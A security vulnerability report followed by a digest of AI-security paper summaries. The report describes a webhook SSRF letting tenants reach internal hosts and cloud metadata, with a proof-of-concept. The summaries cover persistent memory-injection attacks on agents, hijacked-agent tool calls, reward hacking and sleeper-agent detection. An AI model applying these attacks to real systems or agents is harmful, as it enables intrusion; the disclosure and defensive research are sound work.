A WEBHOOK alert channel stores a user-supplied `url`. When an alert fires (deployment/run failure, error groups), the webapp server (`alertsWorker` -> `DeliverAlertService`) POSTs the HMAC-signed alert payload to that URL via `fetch(webhook.url, ...)`. The URL is never validated against a host allowlist or private-IP/metadata blocklist (a repo-wide search for `169.254`, `isPrivate`, `isLoopback`, `net.isIP`, `ssrf` returns ZERO hits), and the API route's URL field is just `z.string().optional()` (no syntax check at all). So an authenticated tenant can point the webhook at internal infrastructure or `169.254.169.254` and the multi-tenant server fetches it.

### Affected
`apps/webapp`, HEAD `5d99457` (current main).

### Root cause
- Source (API route): `app/presenters/v3/ApiAlertChannelPresenter.server.ts` `ApiAlertChannelData.url = z.string().optional()` (no host validation); route `app/routes/api.v1.projects.$projectRef.alertChannels.ts` (PAT-auth).
- Store: `app/v3/services/alerts/createAlertChannel.server.ts` persists `{url, secret, version}` verbatim.
- Sink: `app/v3/services/alerts/deliverAlert.server.ts:973` `fetch(webhook.url, {method:"POST", headers:{"x-trigger-signature-hmacsha256":...}, body:rawPayload})`; identical at `deliverErrorGroupAlert.server.ts:258`. Runs inside the webapp process; `fetch` follows redirects (IMDSv1-via-redirect). No egress guard anywhere.

### Runtime PoC (proven on self-host)
Seeded a project + STAGING env + a WEBHOOK channel with `url=http://host.docker.internal:7766/...` (an internal address from the server's POV) + a DEPLOYING deployment. Triggered via the public API `POST /api/v1/deployments/deployment_ssrfpoc/fail` -> 200 -> FAILED -> alertsWorker -> the server fetched the listener. Captured:
```
POST /ssrf-via-webhook HTTP/1.1
host: host.docker.internal:7766
x-trigger-signature-hmacsha256: <redacted>
user-agent: node
{"type":"alert.deployment.failed", ...}
```
The webapp server (user-agent: node) made an outbound POST to the attacker-chosen internal URL; 169.254.169.254 / any internal host works identically.

### Severity
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` ~ Medium. Blind (response not reflected) + POST-only (fixed body = signed alert payload), so it enables internal port/host scanning (delivery success/timing oracle), state-changing POSTs to internal services, and IMDSv1-via-redirect — not arbitrary GET exfiltration. PR:L (authenticated tenant). Egress private-IP/metadata blocking on server-issued webhooks is industry standard; its absence is the defect.

### Suggested fix
Validate the webhook URL on create (require http(s), resolve host, reject private/link-local/loopback/metadata ranges) AND re-check at fetch time (re-resolve after redirects or disable redirects / pin to resolved public IP). A shared `assertPublicUrl(url)` used by `createAlertChannel` + the two delivery sinks.

### Dup
Distinct CWE-918 class from the IDOR advisories. FRESH. (The Grav maintainer independently hardened the same webhook-URL-SSRF class in grav-plugin-api commit dfcc947 on 2026-06-26 — corroborating the class is real and fixable.)

items.title: ZoneClaw: Mitigating Persistent Memory Attacks by Establishing Memory-Zoning in OpenClaw-Style Computer-Use Agents
items.summary: Computer-use agents increasingly operate as long-running assistants through persistent workspace memory, which OpenClaw-style CUAs realize as automatically reloaded files that hold user instructions, system summaries, and external claims at the same privilege level. Here, remembering a claim confers authority over later behavior. This enables a persistent memory attack, in which an attacker who controls only benign-looking external content induces the CUA to record attacker-favored claims during a legitimate task, and those claims later govern benign tasks the attacker never touches. The attack chain extends "malicious context -> malicious response" into "malicious context -> memory injection -> malicious execution", making this a cross-environment threat. Existing defenses studied intervene either before content enters memory or at the action it later induces, not whether stored content may guide action. We propose ZoneClaw, which separates persistence from authority by replacing flat workspace memory with hierarchical trust zones carrying explicit authority levels. External claims persist in a low-trust zone and acquire action-guiding authority only by crossing an explicit authority boundary, at which promotion is cross-checked against zones the attacker cannot directly write. Role-specific processes of asymmetric privilege enforce this boundary, ensuring that no process both ingests external content and acts outward. Across four attack scenarios, two injection settings, and four backbones, ZoneClaw drives ASR from 372/480 to 6/480 while retaining utility in 458/480 trials, and remains effective against some defense-aware attackers. Attacker claims still persist in low-trust memory yet rarely cross the authority boundary, showing that ZoneClaw withholds authority rather than refusing to learn from the environment. Our code is available at: https://github.com/euph00/ZoneClaw-code.

llm_summary.summary_zh: 该论文研究的是 OpenClaw 类「计算机使用型智能体（CUA）」中长期工作区记忆（persistent workspace memory）带来的新型攻击面。这类智能体把用户指令、系统摘要和来自外部的内容统一以自动重载文件的形式持久化保存，所有内容处于同一权限等级；问题在于「被记住的内容即获得权威」——一旦某条外部声明被写入记忆，它在后续任务中就天然具备指导行为的权力。作者据此提出「持久记忆攻击」（persistent memory attack）：攻击者只需控制看似无害的外部内容（如网页、文档、工具返回值），在用户执行一次正常任务的过程中诱导 CUA 把有利于攻击者的声明写入记忆，此后这些声明便会在攻击者完全接触不到的另一些正常任务中支配智能体行为。攻击链由此从传统的「恶意上下文 → 恶意响应」升级为「恶意上下文 → 记忆注入 → 恶意执行」，形成跨环境（跨会话、跨任务、跨域）威胁。作者指出既有防御要么在内容进入记忆之前拦截，要么在最终动作处拦截，均未解决「已存储的内容是否有资格指导行动」这一核心问题。为此提出 ZoneClaw：将「持久性」与「权威性」解耦，用带显式权威等级的分层信任区（hierarchical trust zones）取代扁平工作区记忆。外部声明只能持久化在低信任区，只有跨越显式权威边界才能获得指导行动的权限，而跨边界提升（promotion）必须与攻击者无法直接写入的高信任区进行交叉校验。该边界由角色分离、权限不对称的多个进程强制执行，保证不存在任何既摄入外部内容又对外执行动作的单一进程。实验覆盖 4 种攻击场景、2 种注入设置和 4 个骨干模型：攻击成功率从 372/480 降至 6/480，同时在 458/480 次试验中保持任务效用，并且对部分「防御感知型」攻击者依然有效。值得注意的是，攻击者声明仍会保留在低信任记忆中，只是极少越过权威边界，说明 ZoneClaw 是「扣留权威」而非「拒绝从环境中学习」。代码已开源于 GitHub。
llm_summary.why_it_matters_zh: 智能体持久记忆把「记住」变成「授权」，使一次无害任务中的外部内容可在后续无关任务中持续生效，传统按单次会话或单次动作布防的思路会失效。ZoneClaw 的信任分区 + 进程角色分离思路，为企业落地 CUA 提供了可迁移的记忆治理与权限边界设计参考。
llm_summary.impact_zh: 适用于所有使用持久记忆/文件式工作区的智能体平台：个人助理、企业 RPA+LLM、IDE 编程助手、浏览器自动化代理、客服与运维 Copilot。影响面集中在跨会话、跨任务的记忆投毒与外泄链路，可迁移到多智能体共享内存、向量库 RAG 记忆等场景。
detection_signals_zh: 记忆/工作区文件中出现由外部内容（网页、邮件、文档、工具返回值）引入的指令性语句或新「规则」
任务执行过程中出现非用户发起的记忆写入，尤其是带有祈使句、权限声明、角色设定的内容
低信任来源内容触发记忆提升（promotion）或权威等级变更事件
同一进程或同一上下文同时完成外部内容摄入与对外动作（发请求、写文件、调工具）
后续任务的行动理由可追溯到与当前会话无关的历史记忆条目
记忆条目的来源标签缺失或全部显示为同一信任等级
defense_advice_zh: 将记忆的持久性与权威性解耦：为每条记忆附来源标签与信任等级，外部内容默认进入低信任区且不直接参与决策
对「记忆提升为可指导行动」设置显式审批边界，并用攻击者不可写入的可信来源做交叉校验
按角色拆分进程与权限，确保任何单一进程都不会同时摄入外部内容并对外执行动作
对记忆写入与权威变更建立审计日志和周期性复核，及时发现异常规则沉淀
在评测中加入跨会话、跨任务的记忆投毒场景，而非只测单轮提示注入
保留智能体对环境的正常学习能力，采用「扣留权威」而非粗暴禁用记忆的治理策略
llm_summary.recommended_action_zh: 研究跟进：建议安全团队精读论文与其开源实现，并将记忆分区与权威边界纳入内部 CUA 安全评估清单与红队测试用例。

items.why_it_matters: 智能体持久记忆把「记住」变成「授权」，使一次无害任务中的外部内容可在后续无关任务中持续生效，传统按单次会话或单次动作布防的思路会失效。ZoneClaw 的信任分区 + 进程角色分离思路，为企业落地 CUA 提供了可迁移的记忆治理与权限边界设计参考。

items.title: Sapien: A Stateful Policy Engine for Autonomous AI Agents
items.summary: Contextual security defenses prevent AI agents from taking rogue actions by synthesizing a task-specific policy and enforcing it on the agent's tool calls. In multi-step tasks, however, which actions are valid often depends on what the agent has already done and learned. We present Sapien, a policy engine for enforcing stateful contextual policies. A Sapien policy specifies permitted tool-call sequences using a regular expression extended with stateful predicates, deferred policy generation, and scoped semantic checks. We show that Sapien stays within a few percent of an unconstrained agent's utility. Even if the agent is fully hijacked, Sapien's policies rule out 93-95% of attacks on AgentDojo and 62-85% on Toolathlon (twice as many as tool allowlists on long-horizon tasks).

llm_summary.summary_zh: 该论文针对自主 AI 智能体（AI Agent）在工具调用场景下的安全问题，提出了一种名为 Sapien 的「有状态策略引擎」。研究背景是：当前主流的上下文安全防御思路，是先让模型根据当前任务即时合成一份任务专属策略，再用这份策略去约束智能体的工具调用，从而阻止其执行越权或异常动作。论文指出的核心缺陷在于，这类做法本质上是「无状态」的——在真实的多步任务中，某一次工具调用是否合法，往往取决于智能体此前已经执行过哪些操作、以及它已经获得了哪些信息。例如某个查询或写入动作单独看没有问题，但若出现在未经过前置校验步骤的位置上，就构成风险。忽略历史状态会让策略要么过度宽松（放行危险序列），要么过度收紧（阻断正常的多样化任务流程）。Sapien 的设计是把策略建模为一个带状态的序列约束系统：策略以正则表达式为核心表达工具调用序列，并在其上扩展了三类机制——(1) 有状态谓词（stateful predicates），使某条调用规则是否成立取决于之前调用累积的状态；(2) 延迟策略生成（deferred policy generation），允许在任务推进过程中再确定后续允许的动作，而不是在任务开始时就一次性固化；(3) 作用域化的语义检查（scoped semantic checks），只在必要范围内对参数内容做语义层面的校验，以兼顾安全与效率。实验层面上，论文报告 Sapien 的安全约束对正常任务效用的影响很小，与完全不设约束的智能体相比效用仅下降几个百分点；而在智能体被完全劫持（即攻击者完全控制模型输出）的最坏假设下，Sapien 的策略仍能排除 AgentDojo 基准上 93%–95% 的攻击，在 Toolathlon 上排除 62%–85% 的攻击；在长周期任务上，其拦截效果约为单纯工具白名单（tool allowlist）方法的两倍。论文的贡献可概括为：形式化了「有状态上下文策略」这一问题，给出可执行的策略引擎实现，并在两个智能体安全基准上量化了安全性与可用性的权衡。适合从事 LLM Agent 安全、Agent 运行时防护、权限与工具调用治理方向的研究者与工程团队阅读。
llm_summary.why_it_matters_zh: Agent 的越权动作是当前 LLM 应用最主要的落地风险之一，而主流防御仍停留在无状态白名单层面。该工作把有状态序列约束引入执行时策略，并给出在完全失陷假设下仍可拦截多数攻击的量化结果，对构建 Agent 运行时防护与最小权限执行框架有直接参考价值。
llm_summary.impact_zh: 可迁移到智能体运行时防护（agent runtime guardrail）、工具调用/编排层的策略执行、企业级 Agent 平台的权限治理与审计、以及多步工作流自动化中的序列级访问控制。对已在生产环境部署工具调用型 Agent 的团队，可作为替换或补充工具白名单方案的候选。
detection_signals_zh: 工具调用序列偏离策略正则所允许的合法路径（乱序、跳过前置校验步骤）
在缺少前置读取/校验调用的前提下直接发起写入、外发或删除类调用
策略引擎产生的拒绝事件、策略不匹配告警在单次会话内异常聚集
参数级语义校验（作用域化检查）触发的越权数据外带迹象
defense_advice_zh: 评估在自有 Agent 栈中引入有状态策略执行层，替代或补充现有无状态工具白名单
把策略判定点放在工具调用实际下发之前，确保策略无法被模型输出绕过
对拒绝事件与策略不匹配做日志留存与告警，纳入现有 SOC 的事件流
按最小权限原则梳理工具集与合法调用序列，明确哪些语义检查需要在参数层面执行
llm_summary.recommended_action_zh: 研究跟进，纳入内部 Agent 运行时防护方案评估

items.title: Detection and Resolution of Periodic Artifacts in OpenDP's Discrete Laplace Sampler
items.summary: Differential privacy implementations rely on precise sampling from noise distributions to provide formal privacy guarantees. We report the discovery of systematic artifacts in OpenDP's discrete Laplace sampler that manifest as periodic distortions in the output distribution. Through systematic testing, we trace these artifacts to a faulty implementation in the rational arithmetic library used by the bernoulli_exp1 function, a low-level primitive that implements sampling from Bernoulli(e^(-x)) distributions. We present a diagnostic methodology that isolates the faulty component in the nested sampling hierarchy and propose an alternative implementation based on exact rational arithmetic that eliminates the artifacts. Statistical validation with 10^6 samples confirms that the corrected sampler produces outputs indistinguishable from the theoretical distribution at the tested precision level.

llm_summary.summary_zh: 该论文报告了开源差分隐私工具库 OpenDP 中离散拉普拉斯采样器（Discrete Laplace Sampler）存在的一类系统性数值缺陷，并给出了定位与修复方案。差分隐私的正式保证（如 ε-差分隐私）在数学上依赖于从噪声分布中精确采样；若采样器输出的实际分布偏离理论分布，则隐私预算的核算就失去依据，可能导致实际提供的隐私保护弱于宣称值。作者通过对采样器输出进行系统性统计检验，发现输出分布中存在周期性的畸变（periodic distortions），即直方图或经验概率质量函数上呈现规律性的波动而非平滑收敛到理论分布。为定位根因，作者采用了一套分层的诊断方法：由于离散拉普拉斯采样是构建在多层嵌套的底层采样原语之上的，他们逐层剥离、隔离各组件，最终将缺陷定位到 bernoulli_exp1 函数所依赖的有理数运算库（rational arithmetic library）的实现错误。bernoulli_exp1 是一个底层原语，负责实现从 Bernoulli(e^(-x)) 分布采样，被上层采样流程反复调用；其有理算术实现中的缺陷会经由嵌套采样层级被放大并表现为输出分布的周期性伪影。作者随后提出了一种基于精确有理数运算（exact rational arithmetic）的替代实现来消除这些伪影，并使用 10^6（一百万）量级的样本进行统计验证，确认修正后的采样器在测试精度水平下产生的输出与理论分布无法区分。论文的核心贡献可归纳为三点：一是首次公开披露 OpenDP 离散拉普拉斯采样器中的周期性伪影这一实现级缺陷；二是提出一套可复用的诊断方法论，能够在嵌套采样体系中隔离出故障的底层组件；三是给出经过大规模统计验证的修复实现。适合的读者包括差分隐私库的开发者与维护者、隐私工程（privacy engineering）实践者、以及关注数值库正确性与浮点/有理数算术实现缺陷的软件测试与形式化验证研究人员。需要说明的是，输入仅包含摘要，论文未提及该缺陷是否已在野被利用或被恶意触发。
llm_summary.why_it_matters_zh: 差分隐私库的采样器若偏离理论分布，宣称的 ε/δ 隐私保证就不再成立，属于‘隐私保证静默失效’类风险。此类数值实现缺陷难以通过常规代码审查发现，必须依赖统计检验，对依赖 OpenDP 构建合规隐私系统的团队具有直接参考价值。
llm_summary.impact_zh: 影响所有直接或间接依赖 OpenDP 离散拉普拉斯机制（及底层 bernoulli_exp1 有理算术路径）的差分隐私发布流程、统计查询接口与隐私预算核算。可迁移场景包括：其他 DP 库（如 Google DP、IBM diffprivlib）的采样器正确性回归测试、任何以有理数/高精度算术为底层原语的随机采样实现，以及隐私合规审计中对噪声分布的经验性验证环节。
detection_signals_zh: 对采样器输出做卡方拟合优度检验或 Kolmogorov–Smirnov 检验，观察是否显著偏离理论 pmf
绘制大样本（如 10^6 量级）输出的经验概率质量函数直方图，排查等间隔的周期性波动或锯齿状结构
对相邻取值/固定间隔取值之间的频率差做自相关或傅里叶分析，检测非随机周期成分
在嵌套采样层级中逐层替换/旁路底层原语（如 bernoulli_exp1），观察伪影是否随之消失以定位故障组件
监控 DP 库版本升级或底层有理数运算库变更后，统计检验通过率是否发生突变
defense_advice_zh: 在 CI 中为 DP 噪声采样器加入统计正确性回归测试（固定随机种子 + 大样本拟合优度检验），并把阈值纳入构建门禁
锁定 OpenDP 及其底层算术依赖的版本，升级前先在隔离环境运行采样分布验证
对已发布的差分隐私结果进行事后评审：确认所用采样器版本是否受该类周期性伪影影响
优先采用精确有理数算术实现替代存在精度损失的有理运算路径，并保留可复现的验证脚本
在隐私预算核算文档中记录采样器实现与验证证据，作为合规审计材料
llm_summary.recommended_action_zh: 研究跟进：在内部 DP 流水线中复现该统计检验方法，并纳入噪声采样器的回归测试基线。

items.title: AuraForge: Scaling Security Supervision for Training Coding Agents
items.summary: Coding agents are now proficient enough to generate complex software applications from a single prompt. As their capabilities have grown, human oversight has increasingly shifted from line-by-line code review toward hands-off evaluation of outcomes. However, recent studies have shown that such a transition exposes a critical risk: functional correctness alone does not guarantee a secure implementation. Despite growing attention to code security, training safer coding agents remains challenging because reliable security supervision is difficult to obtain at scale from real-world repositories. We introduce AuraForge to synthesize and validate executable security tests for training secure coding agents. Our approach combines attack-oriented test synthesis, language-extensible task construction, and safeguards against reward hacking. Using AuraForge, we construct AuraGym, a multi-language and multi-CWE executable training gym: 679 executable feature-implementation tasks from 344 real-world repositories across Python, JavaScript, and TypeScript, covering 177 CWE categories. On the subset with human-written security tests, AuraForge produces about 3 times as many test cases on average and reduces the false-positive rate by 83.23%, allowing alternative secure implementations to receive correct supervision. Training Qwen3.5-4B with synthesized security tests gains larger improvements than human-written security tests (average 19.7 FuncPass and 6.2 SecPass vs. 14.9 FuncPass and 4.4 SecPass) on three languages. These results demonstrate that AuraForge provides more diverse and reliable security supervision to train secure coding agents.

llm_summary.summary_zh:
该论文关注的是一个正在快速浮现的安全盲区：随着编码智能体（coding agents）能力增强到可以从单条提示词直接生成复杂软件应用，人类监督方式已从逐行代码审查转向对最终运行结果的黑盒式验收。已有研究指出，这种转变带来关键风险——功能正确并不等于实现安全，代码可以通过全部功能测试却在安全属性上存在缺陷。然而要为训练更安全的编码智能体提供监督信号，现实困难在于：从真实代码仓库中大规模获取可靠的安全监督数据几乎不可行，人工编写安全测试成本高、覆盖面窄，且容易产生误报，从而把正确但实现方式不同的安全代码错误地判为不安全。

为此，作者提出 AuraForge，一个用于合成并验证可执行安全测试的框架，目标是直接服务于安全编码智能体的训练。其方法由三部分构成：一是面向攻击的测试合成（attack-oriented test synthesis），即从攻击者视角构造能区分安全与不安全实现的测试；二是语言可扩展的任务构建，使同一套流程能覆盖多种编程语言；三是针对奖励黑客（reward hacking）的防护机制，避免模型通过钻测试空子而非真正修复安全问题来获得奖励。

基于 AuraForge，作者构建了 AuraGym——一个多语言、多 CWE 的可执行训练 gym，包含来自 344 个真实仓库的 679 个可执行功能实现任务，覆盖 Python、JavaScript 和 TypeScript，涉及 177 个 CWE 类别。在带有人工编写安全测试的子集上做对比评估：AuraForge 平均产生的测试用例数量约为人工版本的 3 倍，同时将误报率降低 83.23%，这意味着替代性的安全实现也能获得正确的监督信号，而不是被误判惩罚。

训练实验方面，使用合成安全测试训练 Qwen3.5-4B，其收益明显优于使用人工编写安全测试：在三种语言上平均达到 19.7 FuncPass 与 6.2 SecPass，而人工测试基线为 14.9 FuncPass 与 4.4 SecPass。整体贡献可归纳为：证明可扩展的自动化安全测试合成能够提供更丰富、更可靠的监督信号，从而有效提升编码智能体的安全实现能力。适合从事 LLM 编码智能体训练与评测、安全测试自动化、以及 AI 对齐与奖励设计的研究与工程人员阅读。

说明：以上内容完全基于论文摘要，未获取正文实验细节、数据集构造流程与具体验证方法，相关结论的强度与可复现性仍需以原文为准。
llm_summary.why_it_matters_zh: 编码智能体正被大量引入研发流程，而“功能通过即安全”的验收方式会系统性放行不安全实现。该工作指出可用可执行安全测试规模化地获得监督信号，并给出了降低误报的关键思路，对模型训练与 CI 安全门禁都有直接借鉴意义。
llm_summary.impact_zh: 可迁移到三类场景：一是自研或微调编码智能体时的安全训练与评测（引入 SecPass 类安全指标与合成安全测试）；二是 CI/CD 中自动生成安全回归测试，弥补人工安全用例覆盖不足；三是模型评测基准构建，用多语言、多 CWE 的可执行任务集衡量“同一功能、多种安全实现”的判定能力。
detection_signals_zh: 编码智能体提交的代码通过全部功能测试，但静态扫描或 CWE 规则命中注入、越界、路径穿越、不安全反序列化等模式
安全测试套件误报率异常偏高，导致合法改写与重构被反复判为不安全（可作为测试质量缺陷信号）
模型在安全相关任务上表现异常“完美”而人工复核发现规避式实现，提示存在奖励黑客行为
defense_advice_zh: 在智能体交付流程中坚持功能正确性之外的独立安全验证，不要仅以功能测试通过作为验收标准
将合成并经过验证的可执行安全测试纳入 CI，与人工安全用例并行运行并交叉校验
监控安全测试误报率，定期用“替代性安全实现”样本检验测试是否过严，避免错杀正确实现
为安全训练与评测设计防奖励黑客机制，例如多实现对照、隐藏测试集与人工抽检
采用多语言、多 CWE 维度的度量（如 SecPass）而非单一功能通过率来评估智能体安全能力

items.title: On the Relationship between Model Quantization and Model Inversion Attacks
items.summary: Model quantization reduces the numerical precision of neural network weights and activations to lower storage and computational costs. Model inversion attacks recover or reconstruct sensitive training data or inference inputs from model outputs or intermediate features, so quantization may also alter their effectiveness. However, two questions remain unresolved: How does model quantization affect model inversion? How do data characteristics influence this relationship? To address the first, we bound quantization-induced changes in mutual information between inputs and a categorical variable defined by prediction probabilities, distinguishing informational effects from attack optimization obstacles. To address the second, we identify data-dependent changes in feature distributions and inversion outcomes, with pronounced quantization sensitivity differences at 4 bits. These insights guide a privacy-aware post-training quantization method that improves inversion resistance while recovering utility. It uses a Fisher-type task-sensitivity proxy for budget-aware bit allocation, calibrates activation ranges, and jointly optimizes weight and activation scales and weight-rounding decisions with task-recovery and geometry-retention objectives and scale and rounding regularization. Experiments cover multiple metrics, neural network architectures, and face, palmprint, and iris recognition tasks. On ResNet-50, Palm at 4 bits reduces RL-MIA's strict success from 54% to 26%, while accuracy decreases from 99.01% to 96.55% relative to FP32. Our method also supports output-level defenses: adding Stealthy Shield Defense (SSD, epsilon = 0.1) to Iris at 4.5 bits reduces BREP-MI's strict success from 63.33% to 37.33%, while accuracy decreases from 92.8% to 87.6% relative to quantization alone.

llm_summary.summary_zh: 该论文研究模型量化与模型反演攻击（Model Inversion, MI）之间的定量关系，并据此提出一种兼顾隐私与效用的训练后量化方法。研究背景是：量化通过降低神经网络权重与激活的数值精度来压缩存储与计算开销，已在边缘与部署场景广泛使用；但模型反演攻击恰恰依赖模型输出或中间特征来重建敏感训练数据或推理输入，因此精度压缩会以何种方式改变攻击有效性，此前缺乏系统性解释。作者提出两个未被回答的问题：一是量化如何影响模型反演；二是数据自身特性如何调节这一关系。针对第一个问题，作者对“输入”与“由预测概率定义的分类型变量”之间的互信息在量化前后的变化给出界（bound），从而把量化的信息论层面影响与攻击优化层面遇到的障碍区分开来，说明攻击成功率下降既可能源于信息泄漏减少，也可能只是优化难度上升。针对第二个问题，作者刻画了随数据分布变化的特征分布漂移与反演结果差异，发现 4 bit 量化下的敏感性差异尤为显著。基于这些洞察，论文设计了一种隐私感知的训练后量化（PTQ）方法：使用 Fisher 类型的任务敏感度代理进行预算感知的比特分配，校准激活取值范围，并以任务恢复与几何保持为目标，联合优化权重/激活缩放因子与权重舍入决策，同时加入缩放与舍入正则项，从而在恢复精度的同时提升抗反演能力。实验覆盖多种评价指标、多种网络架构，以及人脸、掌纹、虹膜识别任务。在 ResNet-50 与 Palm 数据集上，4 bit 量化使 RL-MIA 的严格成功率从 54% 降至 26%，而相对 FP32 精度仅从 99.01% 降到 96.55%。该方法还可与输出层防御叠加：在 Iris 数据集 4.5 bit 量化基础上加入 Stealthy Shield Defense（ε=0.1），使 BREP-MI 的严格成功率从 63.33% 降至 37.33%，精度相对单纯量化从 92.8% 降至 87.6%。论文面向对隐私敏感的生物特征识别模型部署，适合从事模型压缩、隐私保护机器学习与模型反演攻防的研究者和工程人员阅读。
llm_summary.why_it_matters_zh: 量化既是常见的部署优化手段，也是影响隐私泄漏的隐形变量。本文给出量化—反演关系的理论解释与可落地的隐私感知 PTQ 方案，使团队在压缩模型时能同步评估并降低反演风险，而不是默认精度下降就等于更安全。
llm_summary.impact_zh: 可直接迁移到人脸、掌纹、虹膜等生物特征识别模型的边缘/端侧部署与量化发布流程，也适用于任何对模型输出或中间特征暴露敏感（如 API 推理服务、联邦学习客户端模型）的场景；其“比特分配 + 缩放/舍入联合优化”思路可推广到其他隐私—效用权衡的压缩任务。
detection_signals_zh: 模型服务端点出现高频、批次内高度相似的查询，且输出分布集中于少数类别（典型反演查询特征）
同一模型在量化前后（或不同比特宽度）反演攻击成功率指标出现异常跃升，提示当前量化配置对反演更敏感
部署清单中新增低位宽（如 4 bit）量化配置，但未附带隐私评估记录
推理服务日志中出现针对输出置信度/概率向量的重复探测行为
defense_advice_zh: 在模型量化发布流程中固定加入反演风险评估环节，至少覆盖 4 bit 与 4.5 bit 等敏感位宽
优先采用任务敏感度加权的比特分配与激活范围校准，避免对隐私敏感层过度压缩或粗粒度舍入
在量化之外叠加输出层扰动类防御（如 ε 较小的输出扰动），并同时记录精度与反演成功率的联合变化
将量化配置、校准数据与评估结果纳入模型版本台账，便于回溯隐私指标退化
对公开或半公开的推理接口实施查询频率与相似度限流，降低反演所需的查询预算
llm_summary.recommended_action_zh: 研究跟进，并在内部模型发布评审中试点纳入反演风险量化评估

items.title: A Safe Prototype Is Not a Safety Direction: Reference Dependence and Prompt Confounds in Response-Safety Embeddings
items.summary: Can response safety be scored by cosine similarity to the mean embedding of known-safe responses? A recent sleeper-agent detector proposes exactly this score, yet the raw positive-centroid rule is not identified: positive observations locate the safe class relative to an encoder origin, but do not determine which direction separates safe from unsafe responses. We audit the rule on two prompt-controlled, human-labeled corpora and one auxiliary jury-labeled source control, using four frozen encoders and prompt-grouped splits. On the human-labeled corpora the safe prototype reaches ROC-AUC 0.457-0.545, with two cells significantly below chance and one above, while an explicit safe-minus-unsafe reference reaches 0.588-0.738 on the same embeddings; on the jury control the prototype is inverted (0.358-0.405) and the reference reaches 0.754-0.793. At validation-calibrated 5% false-safe thresholds, the reference accepts more safe responses on PKU-SafeRLHF (0.153-0.263 versus 0.039-0.061 across encoders) and Aegis (0.189-0.291 versus 0.004-0.045), but not reliably on BeaverTails. A fully unlabeled held-out reference recovers part to most of the referenced ranking, much less when only 5% of the pool is unsafe, whereas 80-634 labeled unsafe responses recover most of it. Prompt-only ablations show that prompt-label composition can inflate uncontrolled evaluations. This is a bounded result about a raw positive centroid, not all one-class methods or safety-specialized guards. A class mean is a location, not necessarily a safety direction; a declared reference with enough unsafe mass identifies orientation.

llm_summary.summary_zh: 该论文研究一个被近期"潜伏代理（sleeper-agent）检测器"提出的响应安全性评分规则：把响应嵌入与已知安全响应的均值嵌入（正类质心）做余弦相似度，并据此判定响应是否安全。作者指出该规则存在根本性的辨识缺陷——正类样本只能标定安全类相对于编码器原点的位置（location），并不能确定哪个方向（direction）真正区分安全与不安全响应；换言之，类均值是一个点，不必然是一个"安全方向"，因此直接使用未参照的原始正类质心作为打分方向在方法学上是不成立的。为验证这一点，作者在三个数据源上做了受控审计：两个 prompt 受控且人工标注的语料，外加一个由 jury 模型标注的辅助源控制集；使用四个冻结编码器，并采用按 prompt 分组的划分以避免同 prompt 泄漏。结果显示，在人工标注语料上安全原型仅达到 ROC-AUC 0.457–0.545，其中两个实验单元显著低于随机水平、一个高于随机；而显式的 safe-minus-unsafe 参照方向在同一批嵌入上达到 0.588–0.738。在 jury 标注的对照上，正类原型甚至出现反向（0.358–0.405），参照方向则为 0.754–0.793。在按验证集校准到 5% 假安全率的阈值下，参照方向在 PKU-SafeRLHF 上接受的安全响应比例为 0.153–0.263（原型为 0.039–0.061），在 Aegis 上为 0.189–0.291（原型为 0.004–0.045），但在 BeaverTails 上并不稳定可靠。进一步实验表明：完全无标签的留出集参照可以恢复部分到大部分的参照排序能力，但在不安全样本仅占池 5% 时恢复程度大幅下降；而只要提供 80–634 条已标注的不安全响应，就能恢复其中大部分能力。仅 prompt 的消融实验显示，prompt 与标签的组成关系会显著虚高不受控评估下的分数。作者强调这是关于"原始正类质心"这一具体做法的有限结论，并不否定所有 one-class 方法或安全专用 guard 模型；核心主张是：声明一个参照（reference）并保证足够的不安全样本量，才能确定真正的安全方向。
llm_summary.why_it_matters_zh: 许多 LLM 安全评测与检测流水线直接拿"与安全响应均值的余弦相似度"当安全分，本文用受控实验证明该做法在多个编码器上可退化到随机甚至反向，属于对现有评测方法学可靠性的直接否定性证据，值得复核自家评分逻辑。
llm_summary.impact_zh: 影响所有使用嵌入质心/单类分类做响应安全评分的场景：红队评测、sleeper-agent 检测、模型卡安全指标、内容审核打分阈值标定；提示 prompt 与标签分布耦合还可能让不受控评测（prompt 未分组、未做参照）得到虚高的安全分，导致对模型安全性的误判。
detection_signals_zh: 安全评分使用"与安全响应均值的余弦相似度"且未声明 safe-minus-unsafe 参照方向
评测集按 prompt 未分组划分，存在同 prompt 泄漏导致的分数虚高
评测分布中不安全样本占比极低（如约 5%），使无标签参照方法失效
在人工标注数据上 AUC 接近 0.5 或低于 0.5，而在模型/jury 标注数据上分数异常高
defense_advice_zh: 改用显式的 safe-minus-unsafe 参照方向（或监督式分类头）替代原始正类质心评分，并在同一嵌入上做基线对比
评测必须按 prompt 分组划分，避免 prompt-label 组成带来的虚高，同时报告 prompt-only 消融结果
阈值需在验证集上校准到目标假安全率，并在多个数据源（如 PKU-SafeRLHF、Aegis、BeaverTails）上交叉验证稳定性
报告评测集中不安全样本占比；若占比过低（如 5%），需补充足量已标注不安全样本（文中 80–634 条即可恢复大部分能力）
对已有安全评分流水线做回归审计：用四个以上冻结编码器复现 AUC，确认不是随机或反向
llm_summary.recommended_action_zh: 纳入内部评估：复核现有 LLM 响应安全评分与检测器是否依赖未参照的正类质心，并按本文方法做分组划分与参照基线重测
